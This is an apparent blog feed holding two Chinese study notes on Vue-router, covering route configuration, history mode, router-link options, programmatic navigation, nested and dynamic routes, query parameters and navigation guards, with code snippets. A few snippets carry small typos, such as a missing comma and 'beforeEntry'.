  <entry>
    <title>Vue-router基础学习</title>
    <url>/2020/11/10/Vue-router%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="vue-router学习"><a href="#vue-router学习" class="headerlink" title="vue-router学习"></a>vue-router学习</h1><h2 id="创建vue-cli项目"><a href="#创建vue-cli项目" class="headerlink" title="创建vue-cli项目"></a>创建vue-cli项目</h2><ul>
<li>勾选router选项</li>
<li>vue-router适合构建单页面应用</li>
<li><a href="https://router.vuejs.org/zh/">https://router.vuejs.org/zh/</a></li>
</ul>
<h2 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h2><ul>
<li>src/router/index.js（vue-cli4创建项目时勾选会自动生成）  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//导入相应文件与包</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">&#x27;../views/Home.vue&#x27;</span></span><br><span class="line"><span class="comment">//通过Vue.use(插件)，安装插件</span></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"><span class="comment">//创建VueRouter对象</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        component: Home</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment">//配置路由和组件之间的应用关系</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//将router导出传入Vue实例</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>
<ul>
<li>组件的绑定方法：   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">&#x27;../views/Home.vue&#x27;</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        component: Home</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;About&#x27;</span>,</span><br><span class="line">        component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/About.vue&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>main.js  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    router,</span><br><span class="line">    render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>App.vue  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span> |  </span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>router-link 标签是路由，会被渲染成 a 标签</li>
<li>router-view 标签会根据当前的路径，动态渲染出不同的组件<h2 id="重定向路由"><a href="#重定向路由" class="headerlink" title="重定向路由"></a>重定向路由</h2></li>
</ul>
</li>
<li>src/router/index.js（添加redirect属性来重定向路由）  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        component: Home</span><br><span class="line">        redirect : <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="设置history模式"><a href="#设置history模式" class="headerlink" title="设置history模式"></a>设置history模式</h2></li>
<li>vue-router 默认 hash 模式 —— 使用 URL 的 hash 来模拟一个完整的 URL，于是当 URL 改变时，页面不会重新加载。如果不想要很丑的 hash，我们可以用路由的 history 模式，这种模式充分利用 history.pushState API 来完成 URL 跳转而无须重新加载页面</li>
<li>src/router/index.js（添加mode属性设置）  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes,</span><br><span class="line">    mode:<span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="router-link补充"><a href="#router-link补充" class="headerlink" title="router-link补充"></a>router-link补充</h2></li>
<li>tag属性：tag可以指定router-link之后渲染成什么组件  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> <span class="attr">tag</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>replace属性:replace不会留下history记录，所以指定replace的情况下，后退键不能返回上一个页面中  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> <span class="attr">tag</span>=<span class="string">&quot;button&quot;</span> <span class="attr">replace</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>active-class属性：DOM激活时的样式设置<ul>
<li>单个标签修改<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> <span class="attr">tag</span>=<span class="string">&quot;button&quot;</span> <span class="attr">replace</span> <span class="attr">active-class</span>=<span class="string">&quot;active&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.active</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">color</span><span class="selector-pseudo">:red</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>总体修改(src/router/index.js)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes,</span><br><span class="line">    mode:<span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">    linkActiveClass:<span class="string">&#x27;active&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="通过代码跳转路由"><a href="#通过代码跳转路由" class="headerlink" title="通过代码跳转路由"></a>通过代码跳转路由</h2></li>
</ul>
</li>
<li>绑定点击事件  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;homeClick&quot;</span>&gt;</span>home<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;aboutClick&quot;</span>&gt;</span>about<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>点击事件  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//replace函数与push函数皆可达到跳转效果</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="javascript">    name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">    methods:&#123;</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">homeClick</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;homeClick&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$router.replace(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="comment">//              this.$router.push(&#x27;/&#x27;);</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">aboutClick</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//              this.$router.push(&#x27;/about&#x27;);</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$router.replace(<span class="string">&#x27;/about&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;aboutClick&#x27;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>this.$router.push()：跳转到不同的url，但这个方法会向history栈添加一个记录，点击后退会返回到上一个页面</li>
<li>this.$router.replace()：同样是跳转到指定的url，但是这个方法不会向history里面添加新的记录，点击返回，会跳转到上上一个页面。上一个记录是不存在的</li>
</ul>
</li>
</ul>
<h2 id="动态路由的使用"><a href="#动态路由的使用" class="headerlink" title="动态路由的使用"></a>动态路由的使用</h2><ul>
<li>src/router/index.js(在url后面加 :属性名 来实现动态路由)  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">        &#123;</span><br><span class="line">            path: <span class="string">&#x27;/user/:userId&#x27;</span>,</span><br><span class="line">            name: <span class="string">&#x27;User&#x27;</span>,</span><br><span class="line">            component: User,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure></li>
<li>App.vue(使用v-bind绑定传送数据)  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">v-bind:to</span>=<span class="string">&quot;&#x27;/user/&#x27;+userId&quot;</span>&gt;</span>User<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="javascript">    name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">            userId:<span class="string">&#x27;goodhu&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="不同页面间传值"><a href="#不同页面间传值" class="headerlink" title="不同页面间传值"></a>不同页面间传值</h3></li>
<li>User.vue(此时的userId对应index.js中设置的属性名)  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;userId&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name: <span class="string">&#x27;User&#x27;</span>,</span></span><br><span class="line">        computed: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">userId</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.$route.params.userId;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vue-cli</tag>
        <tag>Vue-router</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-router进阶学习</title>
    <url>/2020/11/10/Vue-router%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="vue-cli打包文件解析"><a href="#vue-cli打包文件解析" class="headerlink" title="vue-cli打包文件解析"></a>vue-cli打包文件解析</h1><h2 id="dist-js-xxx-js文件"><a href="#dist-js-xxx-js文件" class="headerlink" title="dist/js/xxx.js文件"></a>dist/js/xxx.js文件</h2><ul>
<li>app.xxx.js（业务代码）</li>
<li>manifest.xxx.js(底层代码)</li>
<li>vendor.xxx,js（第三方代码）<h1 id="vue-router的路由懒加载"><a href="#vue-router的路由懒加载" class="headerlink" title="vue-router的路由懒加载"></a>vue-router的路由懒加载</h1></li>
<li>按这个方式设置路由，打包后会生成不同组件的js  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;About&#x27;</span>,</span><br><span class="line">        component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/About.vue&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h1><h2 id="父组件"><a href="#父组件" class="headerlink" title="父组件"></a>父组件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;home&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/home/news&quot;</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span> |</span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/home/messages&quot;</span>&gt;</span>消息<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="子组件-HomeNews子组件"><a href="#子组件-HomeNews子组件" class="headerlink" title="子组件(HomeNews子组件)"></a>子组件(HomeNews子组件)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ul&gt;li&#123;新闻$&#125;*4--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>新闻1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>新闻2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>新闻3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>新闻4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name: <span class="string">&#x27;HomeNews&#x27;</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="src-router-index-js文件"><a href="#src-router-index-js文件" class="headerlink" title="src/router/index.js文件"></a>src/router/index.js文件</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">      &#123;</span><br><span class="line">          path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">          name: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">          component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/Home.vue&#x27;</span>),</span><br><span class="line">          children:[</span><br><span class="line">              &#123;</span><br><span class="line">                  path: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                  redirect: <span class="string">&#x27;news&#x27;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                  path: <span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">                  component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/HomeNews.vue&#x27;</span>)</span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                  path: <span class="string">&#x27;messages&#x27;</span>,</span><br><span class="line">                  component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/HomeMessage.vue&#x27;</span>)</span><br><span class="line">              &#125;</span><br><span class="line">          ]</span><br><span class="line">      &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h1></li>
<li>传递参数主要有两种类型：params和query<h2 id="1-params传参请参考第四天学习笔记"><a href="#1-params传参请参考第四天学习笔记" class="headerlink" title="1. params传参请参考第四天学习笔记"></a>1. params传参请参考第四天学习笔记</h2><h2 id="2-query传参"><a href="#2-query传参" class="headerlink" title="2. query传参"></a>2. query传参</h2><h3 id="使用标签传参"><a href="#使用标签传参" class="headerlink" title="使用标签传参"></a>使用标签传参</h3></li>
<li>App.vue  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;&#123;path:&#x27;/about&#x27;,query:&#123;name: &#x27;why&#x27;,id: userId&#125;&#125;&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="javascript">    name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">            userId:<span class="string">&#x27;goodhu&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>About.vue  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;about&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is an about page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;$route.query.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;$route.query.id&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="使用事件传参-接收参数页面与标签传参方法一致"><a href="#使用事件传参-接收参数页面与标签传参方法一致" class="headerlink" title="使用事件传参(接收参数页面与标签传参方法一致)"></a>使用事件传参(接收参数页面与标签传参方法一致)</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;aboutClick&quot;</span>&gt;</span>about<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="javascript">      name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">              userId:<span class="string">&#x27;goodhu&#x27;</span></span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      methods:&#123;</span><br><span class="line"><span class="javascript">          <span class="function"><span class="title">aboutClick</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">this</span>.$router.push(&#123;</span></span><br><span class="line"><span class="javascript">                  path: <span class="string">&#x27;/about&#x27;</span>,</span></span><br><span class="line">                  query: &#123;</span><br><span class="line"><span class="javascript">                      name: <span class="string">&#x27;why&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                      id: <span class="built_in">this</span>.userId</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="router与-route的区别"><a href="#router与-route的区别" class="headerlink" title="$router与$route的区别"></a>$router与$route的区别</h1></li>
<li>$router指向VueRouter对象  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes,</span><br><span class="line">    mode:<span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>$route：假设当前路径为’/‘则$route指向以下单个对象  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        redirect:<span class="string">&#x27;/home&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="全局导航守卫"><a href="#全局导航守卫" class="headerlink" title="全局导航守卫"></a>全局导航守卫</h1><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2></li>
<li><a href="https://router.vuejs.org/zh">https://router.vuejs.org/zh</a><h2 id="单独配置页面标题"><a href="#单独配置页面标题" class="headerlink" title="单独配置页面标题"></a>单独配置页面标题</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    name: <span class="string">&#x27;Home&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.title = <span class="string">&#x27;首页&#x27;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="全局配置页面标题"><a href="#全局配置页面标题" class="headerlink" title="全局配置页面标题"></a>全局配置页面标题</h2></li>
<li>src/router/index.js  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//配置routes添加meta属性</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/Home.vue&#x27;</span>),</span><br><span class="line">        meta:&#123;</span><br><span class="line">            title: <span class="string">&#x27;首页&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br><span class="line"><span class="comment">//创建VueRouter实例</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes,</span><br><span class="line">    mode:<span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//配置beforeEach方法，from表示当前导航即将离开的路由对象，to表示即将要进入的目标的路由对象，next表示跳转函数，调用该方法后才能进入下一个钩子</span></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.title = to.meta.title;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>当有嵌套路由时显示第一个路由标题  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.title = to.matched[<span class="number">0</span>].meta.title;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="全局前置钩子与后置钩子"><a href="#全局前置钩子与后置钩子" class="headerlink" title="全局前置钩子与后置钩子"></a>全局前置钩子与后置钩子</h2></li>
<li>前置钩子  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.title = to.matched[<span class="number">0</span>].meta.title;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>后置钩子  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.afterEach(<span class="function">(<span class="params">to,<span class="keyword">from</span></span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 不需要调用next函数</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="路由独享的守卫"><a href="#路由独享的守卫" class="headerlink" title="路由独享的守卫"></a>路由独享的守卫</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/Home.vue&#x27;</span>),</span><br><span class="line">        beforeEntry: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.title = to.matched[<span class="number">0</span>].meta.title;</span><br><span class="line">            next();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
